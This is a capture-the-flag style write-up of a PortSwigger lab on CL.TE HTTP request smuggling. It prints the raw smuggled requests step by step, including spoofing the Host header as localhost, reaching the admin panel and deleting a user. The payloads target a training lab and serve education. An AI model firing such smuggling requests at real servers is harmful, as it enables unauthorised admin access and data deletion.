# Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te), you'll learn: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201145613.png)

**According to the lab's background, the admin panel is at `/admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201145651.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201145745.png)

However, when we reach there, the application blocks us from accessing to it.

How can we bypass that?

Now, we can send that request to Burp Suite's Repeater, and **test HTTP request smuggling**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201145823.png)

**First, we need to change the request method to POST:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201145854.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201145859.png)

Then, we can test is it vulnerable to **CL.TE** (Front-end uses `Content-Length` header, back-end uses `Transfer-Encoding` header) or **TE.CL** (Front-end uses `Transfer-Encoding` header, back-end uses `Content-Length` header) HTTP request smuggling.

**To test CL.TE, we can:**

- Send an attack POST request to `/`:

```http
POST / HTTP/1.1
Host: 0a2f009403af3669c1fc45c300e100cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Foo: x
```

**This request will smuggle a GET request to `/admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201150813.png)

- Then, send a normal GET request to `/`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201150852.png)

We successfully bypass the access block!

However, it said: "Admin interface only available to local users".

**Luckly, we can still bypass this by supplying another HTTP header called `Host`:**
```http
POST / HTTP/1.1
Host: 0a2f009403af3669c1fc45c300e100cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Foo: x
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201152216.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201152221.png)

Hmm... "Duplicate header names are not allowed".

**To bypass that, we can smuggle an empty GET parameter:**
```http
POST / HTTP/1.1
Host: 0a2f009403af3669c1fc45c300e100cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 15

bypasspls=
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201152444.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201152503.png)

Nice!! We successfully fully bypassed the access block!

**Let's delete user `carlos` by smuggling a request:**
```http
POST / HTTP/1.1
Host: 0a2f009403af3669c1fc45c300e100cd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Transfer-Encoding: chunked

0

GET /admin/delete HTTP/1.1
Host: localhost
Content-Length: 15

username=carlos&bypasspls=
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201152702.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-6/images/Pasted%20image%2020230201152715.png)

We successfully deleted user `carlos`!

# What we've learned:

1. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability